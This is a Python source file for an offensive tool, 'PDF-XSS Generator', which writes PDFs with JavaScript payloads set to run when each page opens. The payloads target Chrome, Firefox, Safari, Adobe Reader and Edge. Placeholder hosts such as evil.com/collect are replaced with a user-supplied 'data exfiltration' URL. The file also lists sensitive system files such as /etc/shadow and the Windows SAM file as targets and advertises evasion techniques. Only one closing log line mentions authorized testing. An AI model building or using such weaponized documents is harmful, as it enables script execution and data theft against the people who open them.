#!/usr/bin/env python3
"""
PDF-XSS Generator v4.1 - Single File PDF Payload Generator with Full Payload Display
====================================================================================

Generates single PDF files with XSS payloads, always creating one payload per page
with full payload text display and word wrapping.

Features:
- Single file generation with one payload per page (DEFAULT)
- Full payload display with word wrapping on each page
- Browser-specific JSON payload databases with enhanced targeting
- Advanced PDF generation with complete payload visibility
- Payload merging and validation utilities
- OS-aware file system targeting
- Enhanced obfuscation and evasion techniques

Supported Browsers: Chrome, Firefox, Safari, Adobe Reader, Microsoft Edge

Author: SNGWN
Version: 4.1
"""

import argparse
import json
import os
import sys
import platform
import hashlib
import re
import logging
from datetime import datetime
from collections import defaultdict

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# Version and metadata
VERSION = "4.1"
AUTHOR = "SNGWN"

# Configure logging
def setup_logging(log_level=logging.INFO, log_file=None):
    """Setup logging configuration with optional file output"""
    handlers = [logging.StreamHandler(sys.stdout)]
    
    if log_file:
        handlers.append(logging.FileHandler(log_file, encoding='utf-8'))
    
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=handlers
    )
    
    return logging.getLogger(__name__)

logger = setup_logging()

def get_os_specific_paths():
    """Get OS-specific file paths for file system exploits"""
    current_os = platform.system().lower()
    
    if current_os == 'windows':
        return {
            'sensitive_files': [
                'file:///C:/Windows/System32/calc.exe',
                'file:///C:/Windows/System32/cmd.exe', 
                'file:///C:/Windows/System32/drivers/etc/hosts',
                'file:///C:/Windows/win.ini',
                'file:///C:/Windows/System32/config/SAM'
            ],
            'directories': [
                'file:///C:/Windows/System32/',
                'file:///C:/Users/',
                'file:///C:/Program Files/',
                'file:///C:/ProgramData/'
            ]
        }
    elif current_os == 'darwin':  # macOS
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///System/Library/CoreServices/Finder.app',
                'file:///Applications/Calculator.app'
            ],
            'directories': [
                'file:///System/',
                'file:///Users/',
                'file:///Applications/'
            ]
        }
    else:  # Linux/Unix
        return {
            'sensitive_files': [
                'file:///etc/passwd',
                'file:///etc/shadow',
                'file:///etc/hosts',
                'file:///bin/bash',
                'file:///usr/bin/calc'
            ],
            'directories': [
                'file:///etc/',
                'file:///home/',
                'file:///usr/bin/',
                'file:///var/log/'
            ]
        }

def hash_payload(payload):
    """Create a hash of the payload for duplicate detection"""
    normalized = re.sub(r'\s+', ' ', payload.lower().strip())
    normalized = normalized.replace('http://evil.com/collect', '{url}')
    normalized = normalized.replace('http://test.com', '{url}')
    normalized = normalized.replace('https://webhook.site/test', '{url}')
    return hashlib.md5(normalized.encode()).hexdigest()

def validate_payload(payload_data):
    """Validate payload structure and content"""
    required_fields = ['id', 'category', 'browser', 'technique', 'payload', 'description', 'risk_level']
    
    for field in required_fields:
        if field not in payload_data:
            return False, f"Missing required field: {field}"
    
    payload = payload_data['payload']
    if len(payload) < 10:
        return False, "Payload too short"
    
    return True, "Valid"

def load_browser_payloads(browser):
    """Load payloads for a specific browser with robust error handling"""
    browser_file = f"{browser}.json"
    
    if not os.path.exists(browser_file):
        logger.error(f"Browser file not found: {browser_file}")
        return []
    
    try:
        with open(browser_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            payloads = data.get('payloads', [])
            logger.info(f"Loaded {len(payloads)} payloads for {browser} from {browser_file}")
            return payloads
    except json.JSONDecodeError as e:
        logger.error(f"Invalid JSON in {browser_file}: {e}")
        return []
    except IOError as e:
        logger.error(f"Cannot read {browser_file}: {e}")
        return []
    except Exception as e:
        logger.error(f"Unexpected error loading {browser_file}: {e}")
        return []

def substitute_url_in_payload(payload, target_url):
    """Replace placeholder URLs in payload with target URL"""
    substitutions = [
        'http://evil.com/collect',
        'http://test.com',
        'https://webhook.site/test',
        'https://evil.com/collect',
        '{url}',
        'EXFILTRATION_URL'
    ]
    
    for placeholder in substitutions:
        payload = payload.replace(placeholder, target_url)
    
    return payload

def create_pdf_content(payloads, target_url, pdf_version="1.7", single_file=True):
    """Create PDF content with XSS payloads - Always creates single file with one payload per page"""
    os_paths = get_os_specific_paths()
    
    # Always create single PDF with all payloads (one per page)
    return create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths)

def wrap_text_for_pdf(text, max_chars_per_line=70):
    """Wrap text for display in PDF with proper line breaks"""
    if not text:
        return []
    
    words = text.split()
    lines = []
    current_line = ""
    
    for word in words:
        if len(current_line + " " + word) <= max_chars_per_line:
            if current_line:
                current_line += " " + word
            else:
                current_line = word
        else:
            if current_line:
                lines.append(current_line)
                current_line = word
            else:
                # Word is too long, break it
                lines.append(word[:max_chars_per_line])
                current_line = word[max_chars_per_line:]
    
    if current_line:
        lines.append(current_line)
    
    return lines

def format_json_for_pdf(payload_data, max_chars_per_line=70):
    """Format JSON payload data for readable display in PDF"""
    if not payload_data:
        return []
    
    # Create a formatted JSON string with nice indentation
    json_str = json.dumps(payload_data, indent=2, ensure_ascii=False)
    
    # Split into lines and wrap long lines
    json_lines = json_str.split('\n')
    formatted_lines = []
    
    for line in json_lines:
        if len(line) <= max_chars_per_line:
            formatted_lines.append(line)
        else:
            # For long lines, try to wrap at reasonable points
            wrapped = wrap_text_for_pdf(line, max_chars_per_line)
            formatted_lines.extend(wrapped)
    
    return formatted_lines

def create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths):
    """Create a single PDF file with multiple pages - one payload per page with full payload display"""
    pdf_files = []
    
    if not payloads:
        return pdf_files
    
    browser = payloads[0].get('browser', 'unknown')
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{browser}_all_payloads_{timestamp}.pdf"
    
    # PDF header
    pdf_content = f"%PDF-{pdf_version}\n"
    pdf_content += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    
    # Pages object
    page_refs = []
    for i in range(len(payloads)):
        page_refs.append(f"{3 + i*3} 0 R")  # Changed to i*3 to account for font objects
    
    pdf_content += f"2 0 obj\n<< /Type /Pages /Kids [{' '.join(page_refs)}] /Count {len(payloads)} >>\nendobj\n"
    
    # Create pages
    obj_num = 3
    for i, payload_data in enumerate(payloads):
        payload = substitute_url_in_payload(payload_data['payload'], target_url)
        
        # Page object
        pdf_content += f"{obj_num} 0 obj\n"
        pdf_content += f"<< /Type /Page /Parent 2 0 R /Contents {obj_num + 1} 0 R "
        pdf_content += "/MediaBox [0 0 612 792] "
        pdf_content += f"/Resources << /Font << /F1 {obj_num + 2} 0 R >> >> "
        
        # Add JavaScript action
        pdf_content += f"/AA << /O << /S /JavaScript /JS ({payload}) >> >> "
        pdf_content += ">>\nendobj\n"
        
        # Content stream with full JSON payload display and execution
        description = payload_data.get('description', 'XSS Payload')
        technique = payload_data.get('technique', 'Unknown')
        risk_level = payload_data.get('risk_level', 'medium')
        
        # Format the entire JSON object for display
        json_lines = format_json_for_pdf(payload_data, 65)
        
        # Calculate content length dynamically
        content_lines = []
        content_lines.append("BT")
        content_lines.append("/F1 10 Tf")  # Slightly smaller font to fit more content
        content_lines.append("50 750 Td")
        content_lines.append(f"(Payload #{i+1}: {description}) Tj")
        content_lines.append("0 -15 Td")
        content_lines.append(f"(Technique: {technique} | Risk: {risk_level}) Tj")
        content_lines.append("0 -20 Td")
        content_lines.append("(Complete Payload JSON Reference:) Tj")
        content_lines.append("0 -15 Td")
        content_lines.append("(=====================================) Tj")
        content_lines.append("0 -10 Td")
        
        # Add formatted JSON lines
        for line in json_lines:
            # Escape special characters for PDF
            escaped_line = line.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
            content_lines.append(f"({escaped_line}) Tj")
            content_lines.append("0 -12 Td")
        
        content_lines.append("0 -10 Td")
        content_lines.append("(=====================================) Tj")
        content_lines.append("0 -15 Td")
        content_lines.append("(NOTE: Payload also embedded for execution on this page) Tj")
        content_lines.append("ET")
        
        content_stream = "\n".join(content_lines)
        content_length = len(content_stream)
        
        pdf_content += f"{obj_num + 1} 0 obj\n"
        pdf_content += f"<< /Length {content_length} >>\nstream\n"
        pdf_content += content_stream
        pdf_content += "\nendstream\nendobj\n"
        
        # Font object for this page
        pdf_content += f"{obj_num + 2} 0 obj\n"
        pdf_content += "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n"
        
        obj_num += 3
    
    # Xref table
    pdf_content += "xref\n"
    pdf_content += f"0 {obj_num}\n"
    pdf_content += "0000000000 65535 f \n"
    
    # Calculate approximate offsets (simplified)
    for i in range(1, obj_num):
        offset = str(i * 200).zfill(10)  # Increased offset spacing
        pdf_content += f"{offset} 00000 n \n"
    
    # Trailer
    pdf_content += "trailer\n"
    pdf_content += f"<< /Size {obj_num} /Root 1 0 R >>\n"
    pdf_content += "startxref\n0\n%%EOF"
    
    pdf_files.append((filename, pdf_content))
    return pdf_files

# Individual PDF creation function removed - now only creates single files

def save_pdf_files(pdf_files, output_dir):
    """Save PDF files to output directory"""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    saved_files = []
    for filename, content in pdf_files:
        filepath = os.path.join(output_dir, filename)
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            saved_files.append(filename)
        except Exception as e:
            print(f"❌ Error saving {filename}: {e}")
    
    return saved_files

def list_available_browsers():
    """List available browsers and their payload counts"""
    browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
    print("📊 AVAILABLE BROWSERS AND PAYLOAD COUNTS:")
    print("=" * 45)
    
    for browser in browsers:
        browser_file = f"{browser}.json"
        if os.path.exists(browser_file):
            try:
                with open(browser_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    count = len(data.get('payloads', []))
                    print(f"✅ {browser:<8} - {count} payloads ({browser_file})")
            except:
                print(f"❌ {browser:<8} - Error loading {browser_file}")
        else:
            print(f"❌ {browser:<8} - File not found: {browser_file}")

def main():
    parser = argparse.ArgumentParser(
        description="PDF-XSS Generator v4.1 - Single File PDF Payload Generator with Full Payload Display",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 pdf_xss_generator.py -b chrome -u http://test.com           # Generate single Chrome PDF with all payloads
  python3 pdf_xss_generator.py -b firefox -u http://evil.com         # Generate single Firefox PDF with all payloads
  python3 pdf_xss_generator.py -b safari --count 5                   # Generate single Safari PDF with 5 payloads
  python3 pdf_xss_generator.py -b adobe -u http://webhook.site/xyz   # Generate single Adobe PDF with all payloads
  python3 pdf_xss_generator.py -b all -u http://test.com             # Generate single PDF with all browser payloads

BROWSER-SPECIFIC JSON FILES:
  chrome.json   - Chrome/PDFium specific payloads (Enhanced with modern evasion)
  firefox.json  - Firefox/PDF.js specific payloads  
  safari.json   - Safari/PDFKit specific payloads
  adobe.json    - Adobe Reader/Acrobat specific payloads
  edge.json     - Microsoft Edge specific payloads

FEATURES:
  ✓ Single file generation with one payload per page (DEFAULT)
  ✓ Full payload display with word wrapping on each page
  ✓ Enhanced browser-specific payload targeting
  ✓ Advanced Chrome evasion techniques
  ✓ Complete payload visibility in PDF files
  ✓ OS-aware file system targeting
  ✓ Payload validation and merging utilities
        """)
    
    parser.add_argument('-b', '--browser', 
                        choices=['chrome', 'firefox', 'safari', 'adobe', 'edge', 'all'],
                        help='Target browser (required unless using --list-browsers)')
    parser.add_argument('-u', '--url', required=True,
                        help='Target URL for data exfiltration (REQUIRED)')

    parser.add_argument('-o', '--output-dir', default='Files',
                        help='Output directory for PDF files (default: Files)')
    # --single-file argument removed as it's now the default behavior
    parser.add_argument('--count', type=int,
                        help='Limit number of payloads to generate')
    parser.add_argument('--pdf-version', choices=['1.0', '1.1', '1.2', '1.3', '1.4', '1.5', '1.6', '1.7', '2.0'],
                        default='1.7', help='PDF version (default: 1.7)')
    parser.add_argument('--list-browsers', action='store_true',
                        help='List available browsers and payload counts')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                        default='INFO', help='Logging level (default: INFO)')
    parser.add_argument('--log-file', help='Log file path (optional, logs to console by default)')
    
    args = parser.parse_args()
    
    # Setup logging with user-specified level
    global logger
    log_level = getattr(logging, args.log_level)
    logger = setup_logging(log_level=log_level, log_file=args.log_file)
    
    if args.list_browsers:
        list_available_browsers()
        return
    
    if not args.browser:
        parser.error("Browser selection required. Use -b/--browser or --list-browsers")
    
    logger.info(f"PDF-XSS GENERATOR v{VERSION}")
    logger.info(f"Target Browser: {args.browser}")
    logger.info(f"Target URL: {args.url}")
    logger.info(f"Output Directory: {args.output_dir}")
    logger.info(f"PDF Version: {args.pdf_version}")
    if args.count:
        logger.info(f"Payload Limit: {args.count}")
    
    # Load payloads
    if args.browser == 'all':
        browsers = ['chrome', 'firefox', 'safari', 'adobe', 'edge']
        all_payloads = []
        for browser in browsers:
            browser_payloads = load_browser_payloads(browser)
            if browser_payloads:
                all_payloads.extend(browser_payloads)
        payloads = all_payloads
        logger.info(f"Total payloads loaded from all browsers: {len(payloads)}")
    else:
        logger.info(f"Loading {args.browser} payloads...")
        payloads = load_browser_payloads(args.browser)
        if payloads:
            logger.info(f"Loaded {len(payloads)} payloads for {args.browser}")
    
    if not payloads:
        logger.error("No payloads loaded. Exiting.")
        return
    
    # Limit payloads if requested
    if args.count:
        payloads = payloads[:args.count]
        logger.info(f"Limited to {len(payloads)} payloads")
    
    # Generate PDF files - Always single file with one payload per page
    logger.info(f"Creating single PDF file with {len(payloads)} payloads (one per page)...")
    
    pdf_files = create_pdf_content(payloads, args.url, args.pdf_version, single_file=True)
    
    if pdf_files:
        saved_files = save_pdf_files(pdf_files, args.output_dir)
        
        for filename in saved_files:
            logger.info(f"PDF file created: {filename}")
        
        logger.info(f"Generation complete - {len(saved_files)} PDF files created in {args.output_dir}/")
        logger.warning("These PDF files contain XSS payloads for authorized security testing only.")
        logger.warning("Use only with proper permissions in controlled environments.")
    else:
        print("❌ No PDF files were created.")

if __name__ == "__main__":
    main()